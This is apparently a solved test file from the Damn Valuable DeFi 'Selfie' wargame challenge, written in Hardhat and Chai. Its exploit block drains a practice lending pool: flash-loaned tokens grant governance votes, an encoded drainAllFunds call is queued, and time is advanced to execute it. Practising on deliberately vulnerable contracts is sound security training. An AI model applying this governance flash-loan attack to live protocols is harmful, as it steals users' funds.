const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Selfie', function () {
    let deployer, attacker;

    const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens
    
    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
        const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
        const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);

        this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
        this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
        this.pool = await SelfiePoolFactory.deploy(
            this.token.address,
            this.governance.address    
        );

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal(TOKENS_IN_POOL);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        // Idea: use governance queueAction to call drainAllFunds on SelfiePool
        // receiver: attacker
        // calldata: drainAllFunds(attacker.address)
        // 
        // Caveats:
        // - make sure attacker has enough governance votes to queueAction
        // - make sure weiAmount sent is enough to pay for gas

        // You need > half of all DVT tokens to propose action, flashloan then we can call executeAction

        [deployer, attacker] = await ethers.getSigners();
        const AttackFactory = await ethers.getContractFactory('AttackSelfie', attacker);
        // I think DVTSnapshot is an extension of ERC20 DVT contract
        this.attackFactory = await AttackFactory.deploy(this.token.address, this.pool.address, this.governance.address, this.token.address);

        let ABI = [
            "function drainAllFunds(address receiver)"
        ];
        let iface = new ethers.utils.Interface(ABI);
        const calldata = iface.encodeFunctionData("drainAllFunds", [ attacker.address ]);
        console.log(calldata);

        await this.attackFactory.connect(attacker).attack(calldata);

        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days

        await this.attackFactory.connect(attacker).finishHim();
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.equal(TOKENS_IN_POOL);        
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal('0');
    });
});
